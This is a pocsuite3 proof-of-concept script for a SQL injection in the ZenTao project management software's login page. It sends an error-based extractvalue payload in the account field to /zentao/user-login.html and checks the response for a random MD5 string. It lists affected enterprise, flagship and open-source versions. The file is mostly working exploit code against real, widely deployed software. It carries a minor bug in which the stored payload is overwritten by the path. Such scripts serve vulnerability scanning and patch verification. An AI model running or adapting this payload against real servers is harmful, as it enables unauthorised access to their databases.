from collections import OrderedDict
from urllib.parse import urljoin
import re,random,hashlib
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2022-07-29'  #漏洞公开的时间,不知道就写今天
    createDate = '2022-07-29'  # 编写 PoC 的日期
    updateDate = '2022-07-29'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = '禅道SQL注入漏洞'  # PoC 名称
    appPowerLink = 'https://www.zentao.net/'  # 漏洞厂商主页地址
    appName = '禅道'  # 漏洞应用名称
    appVersion = '''禅道企业版 6.5
禅道旗舰版 3.0
禅道开源版 16.5
禅道开源版 16.5.beta1'''  # 漏洞影响版本
    vulType = VUL_TYPE.SQL_INJECTION  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        青岛易软天创网络科技有限公司-禅道是一款国产的开源项目管理软件。
        禅道登录处存在SQL注入漏洞。攻击者可利用漏洞获取数据库敏感信息。
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    def _verify(self):
        result = {}
        # 随机生成字符串
        str_num = str(random.randint(10000,99999))
        #计算md5值
        str_md5= hashlib.md5(str_num.encode()).hexdigest()
        path = "/zentao/user-login.html"
        headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }
        url = self.url + path
        # 使其报错并输出随机md5值
        payload ="' and (select extractvalue(1,concat(0x5e5e21,md5("+str_num+"),0x5e5e21)))--+"
        data = "account=123"+payload+"&password=a9aeee24cba2af4396e86842a39f4676&passwordStrength=0&referer=%2Fzentao%2F&verifyRand=324666340&keepLogin=0&captcha="
        try:
            resq = requests.post(url=url,headers=headers,data=data,timeout=5)
            # 报错显示的md5值只能 显示大概26位，这里选择对比前15位
            if resq.status_code == 200 and str_md5[0:15] in resq.text:
                #print(resq_windows.text)
                result['VerifyInfo'] = {}
                result['VerifyInfo']['POC'] = payload
                result['VerifyInfo']['POC'] = path
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
        return self._verify()
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)